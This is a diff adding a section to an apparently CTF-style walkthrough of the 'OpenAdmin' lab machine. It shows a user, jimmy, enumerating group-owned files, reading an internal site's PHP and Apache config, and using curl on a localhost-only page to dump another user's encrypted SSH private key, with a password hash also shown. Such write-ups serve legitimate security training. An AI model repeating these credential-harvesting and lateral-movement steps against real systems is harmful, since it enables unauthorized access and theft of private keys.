@@ -340,8 +340,128 @@ jimmy@openadmin:~$ find / -perm -u=s -type f 2>/dev/null
 It does'nt appear we can eaily escalation `jimmy`'s account. Let's try looking to see what directories `jimmy` has access to via his account and group he is listed under.
 
 ```bash
-
+jimmy@openadmin:~$ id
+uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
+jimmy@openadmin:~$ find / -group internal 2>/dev/null
+/var/www/internal
+/var/www/internal/main.php
+/var/www/internal/logout.php
+/var/www/internal/index.php
+jimmy@openadmin:~$
 ```
+
+The `internal` directory looks quite interesting, lets go a head a cat the `index.php` and `main.php` and see what we can learn about these files.
+
+```php
+jimmy@openadmin:~$ cat /var/www/internal/index.php
+<h2>Enter Username and Password</h2>
+      <div class = "container form-signin">
+        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
+          <?php
+            $msg = '';
+
+            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
+              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+                  $_SESSION['username'] = 'jimmy';
+                  header("Location: /main.php");
+              } else {
+                  $msg = 'Wrong username or password.';
+              }
+            }
+         ?>
+      </div> <!-- /container -->
+jimmy@openadmin:~$ cat /var/www/internal/main.php
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "<pre>$output</pre>";
+?>
+<html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+```
+
+As we review the php code we can see this looks like it may give us `joanna`'s RSA key to login via ssh `cat /home/joanna/.ssh/id_rsa`. To trigger the `main.php` code we need to make a post request jimmy's username and his hashed password. But the issue is we have no idea how to interact with this "hidden" website. We know that OpenNetAdmin is running on the webservice `apache2` we can attempt to look at the apache2 config to see what ports might be bound to specific URIs.
+
+```bash
+jimmy@openadmin:~$ ls /etc/apache2/sites-available/
+default-ssl.conf  internal.conf  openadmin.conf
+jimmy@openadmin:~$
+```
+
+We can see two configuration files, one being the "OpenAdmin" site and the other being "internal". Let's print the `internal.conf` file and see what we can learn.
+
+```bash
+jimmy@openadmin:~$ cat /etc/apache2/sites-available/internal.conf
+Listen 127.0.0.1:52846
+
+<VirtualHost 127.0.0.1:52846>
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+<IfModule mpm_itk_module>
+AssignUserID joanna joanna
+</IfModule>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+jimmy@openadmin:~$
+```
+
+So we can see that this site is only accessible via "localhost" on port 52846. We can attempt to change the apache2 config to allow this website to be accessible for all address.
+
+```bash
+[ Error writing /etc/apache2/sites-available/internal.conf: Permission denied ]
+```
+
+So we cannot change the config to allow our attacking machine access to this website, we will have to rely on `curl` to talk to this website. First I struggled a lot with trying to send a `POST` request to submit a form to the `index.php` file. Alternatively I ran through the source code one more time and realized I can just call the `main.php` file directly.
+
+```bash
+jimmy@openadmin:~$ curl http://127.0.0.1:52846/main.php
+<pre>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+</pre><html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+jimmy@openadmin:~$
+```
+
+And BINGO, we have `joanne`'s RSA Private Key!
+
+## Joanna
 
 **Proof Screenshot:**
 
